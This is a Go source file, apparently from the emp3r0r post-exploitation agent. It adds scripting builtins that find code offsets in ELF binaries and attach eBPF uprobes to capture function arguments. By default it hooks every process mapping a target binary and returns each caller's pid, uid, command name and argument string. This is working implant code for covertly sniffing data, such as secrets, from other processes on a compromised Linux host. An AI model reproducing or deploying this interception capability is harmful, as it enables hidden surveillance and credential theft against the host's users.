//go:build linux && !android && (386 || amd64 || arm64)

package script

import (
	"fmt"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/elfutil"
	"github.com/jm33-m0/emp3r0r/core/lib/libbpf"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"go.starlark.net/starlark"
)

// Starlark bindings for attaching an eBPF uprobe to a userspace function and
// reading the values it captures. Unlike the enumeration builtins these create
// kernel state; the libbpf dependency and every object it loads are mapped only
// for the duration of the call, and the attached probe is destroyed before the
// call returns.
func init() {
	RegisterAPI("ebpf_code_offset", starlarkEBPFCodeOffset)
	RegisterAPI("ebpf_uprobe_capture", starlarkEBPFUprobeCapture)
}

// starlarkEBPFCodeOffset locates a byte pattern in the executable segments of
// an ELF image and returns the file offset a uprobe attaches to, plus the
// virtual address a runtime memory scan would report.
func starlarkEBPFCodeOffset(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var (
		path    string
		pattern string
	)
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "path", &path, "pattern", &pattern); err != nil {
		return starlark.None, err
	}
	bytesPattern, err := elfutil.HexPattern(pattern)
	if err != nil {
		return ebpfCodeOffsetResult(0, 0, err), nil
	}
	// Read through the agent I/O layer so memfs paths and transparent
	// decryption work and no code path opens a file directly.
	image, err := util.ReadFileAgent(path)
	if err != nil {
		return ebpfCodeOffsetResult(0, 0, fmt.Errorf("read %s: %w", path, err)), nil
	}
	offset, vaddr, err := elfutil.FindCodePattern(image, bytesPattern)
	return ebpfCodeOffsetResult(offset, vaddr, err), nil
}

// ebpfCodeOffsetResult always includes offset, vaddr and error so a script can
// read all three keys regardless of the outcome.
func ebpfCodeOffsetResult(offset, vaddr uint64, err error) *starlark.Dict {
	d := starlark.NewDict(3)
	d.SetKey(starlark.String("offset"), starlark.MakeUint64(offset))
	d.SetKey(starlark.String("vaddr"), starlark.MakeUint64(vaddr))
	txt := ""
	if err != nil {
		txt = err.Error()
	}
	d.SetKey(starlark.String("error"), starlark.String(txt))
	return d
}

// starlarkEBPFUprobeCapture attaches the named program from an in-memory BPF
// object to path/offset and returns the events captured within timeout_ms. The
// default pid (-1) attaches to every process mapping the binary.
func starlarkEBPFUprobeCapture(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var (
		image     string
		path      string
		prog      = "probe"
		reg       = "RSI"
		offset    uint64
		pid       = -1
		timeoutMS = 10000
	)
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs,
		"image", &image,
		"path", &path,
		"offset", &offset,
		"prog??", &prog,
		"reg??", &reg,
		"pid??", &pid,
		"timeout_ms??", &timeoutMS,
	); err != nil {
		return starlark.None, err
	}
	if len(image) == 0 {
		return ebpfUprobeError(fmt.Errorf("ebpf_uprobe_capture: empty BPF object")), nil
	}
	if timeoutMS < 0 {
		return ebpfUprobeError(fmt.Errorf("ebpf_uprobe_capture: timeout_ms must not be negative")), nil
	}
	argIndex := libbpf.ArgRegisterIndex(reg)
	if argIndex < 0 {
		return ebpfUprobeError(fmt.Errorf("ebpf_uprobe_capture: unknown register %q", reg)), nil
	}

	events, err := libbpf.CaptureUprobe(
		[]byte(image),
		prog,
		"events",
		"cfg",
		path,
		pid,
		offset,
		uint32(argIndex),
		time.Duration(timeoutMS)*time.Millisecond,
	)
	if err != nil {
		return ebpfUprobeError(err), nil
	}

	list := starlark.NewList(nil)
	for _, ev := range events {
		list.Append(uprobeEventDict(ev))
	}
	return ebpfResult("events", list, nil), nil
}

// uprobeEventDict renders one captured event in the shape every uprobe builtin
// returns. The dict is always fully populated so scripts never hit a missing
// key.
func uprobeEventDict(ev libbpf.UprobeEvent) *starlark.Dict {
	d := starlark.NewDict(5)
	d.SetKey(starlark.String("pid"), starlark.MakeUint64(uint64(ev.PID)))
	d.SetKey(starlark.String("uid"), starlark.MakeUint64(uint64(ev.UID)))
	d.SetKey(starlark.String("retval"), starlark.MakeInt64(ev.Retval))
	d.SetKey(starlark.String("comm"), starlark.String(ev.Comm))
	d.SetKey(starlark.String("arg"), starlark.String(ev.Arg))
	return d
}

// ebpfUprobeError keeps the result-dict shape consistent on failure: callers
// can always read both "events" and "error" without a missing-key error.
func ebpfUprobeError(err error) *starlark.Dict {
	return ebpfResult("events", starlark.NewList(nil), err)
}
